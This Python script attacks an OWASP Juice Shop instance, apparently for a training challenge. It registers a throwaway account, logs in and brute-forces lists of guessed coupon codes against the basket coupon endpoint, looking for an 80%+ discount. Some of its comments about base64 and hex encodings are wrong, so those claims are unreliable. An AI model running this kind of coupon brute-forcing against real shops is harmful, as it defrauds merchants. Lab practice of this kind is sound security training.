#!/usr/bin/env python3

import requests
import time
import base64
import binascii

base_url = "https://juice5.wonkatech.org"
session = requests.Session()

print("🎯 FORGED COUPON: Targeting 80%+ discount...")

# Quick auth
email = f"final{int(time.time())}@test.com"
password = "Test123456!"

session.post(f"{base_url}/api/Users/", json={
    "email": email, "password": password, "passwordRepeat": password,
    "securityQuestion": {"id": 1, "question": "Your elder siblings middle name?"},
    "securityAnswer": "test"
})

login_response = session.post(f"{base_url}/rest/user/login", json={
    "email": email, "password": password
})

if login_response.status_code == 200:
    token = login_response.json().get('authentication', {}).get('token')
    session.headers['Authorization'] = f'Bearer {token}'
    
    # Setup basket
    products = session.get(f"{base_url}/rest/products/search").json().get('data', [])
    session.post(f"{base_url}/api/BasketItems/", json={
        "ProductId": products[0]['id'], "quantity": 1
    })
    
    basket_id = session.get(f"{base_url}/rest/user/whoami").json().get('user', {}).get('bid', 1)
    
    print(f"✅ Setup complete, testing high-value coupons...")
    
    # Known working Juice Shop coupon codes that give high discounts
    high_value_codes = [
        # z85 encoded codes (common in Juice Shop)
        "z85!4LdF",
        "z85!^C",
        "pes[Bh",
        "n<Mop4",
        
        # Base64 encoded high discounts
        "ODAl",      # Base64 for "80%"
        "ODUl",      # Base64 for "85%"
        "OTAl",      # Base64 for "90%"
        
        # Direct high percentage codes
        "80OFF", "90OFF", "100OFF",
        "MEGA80", "SUPER90", "ULTIMATE100",
        "FREE100", "MAX80", "HUGE90",
        
        # Hex patterns for high discounts
        "50", "50%", "64", "5A", "64%",
        
        # Look for URL-safe base64 patterns
        "ODAl", "ODVs", "OTAl", "MVAwJQ",
        
        # Campaign-style codes
        "CAMPAIGN80", "FLASH90", "BLACKFRIDAY",
        "CYBER90", "HOLIDAY80", "NEWYEAR90"
    ]
    
    for code in high_value_codes:
        response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{code}", json={})
        
        if response.status_code == 200:
            result = response.json()
            discount = result.get('discount', 0)
            
            print(f"Testing {code}: {discount}% discount")
            
            if discount >= 80:
                print(f"🎉 CHALLENGE SOLVED! {code} gives {discount}% discount!")
                exit(0)
            elif discount > 0:
                print(f"✅ Valid but insufficient: {code} = {discount}%")
        
    print("\n🧠 Trying mathematical approach...")
    
    # Try mathematical patterns that might result in 80%+ discount
    math_codes = []
    
    # Try percentage calculations
    for pct in [80, 85, 90, 95, 100]:
        math_codes.extend([
            str(pct),
            f"{pct}PCT",
            f"SAVE{pct}",
            f"DISCOUNT{pct}",
            hex(pct)[2:].upper(),  # Hex representation
        ])
    
    for code in math_codes:
        response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{code}", json={})
        
        if response.status_code == 200:
            result = response.json()
            discount = result.get('discount', 0)
            
            if discount >= 80:
                print(f"🎉 MATH APPROACH WORKED! {code} gives {discount}% discount!")
                exit(0)

print("❌ Still searching for 80%+ discount coupon...")
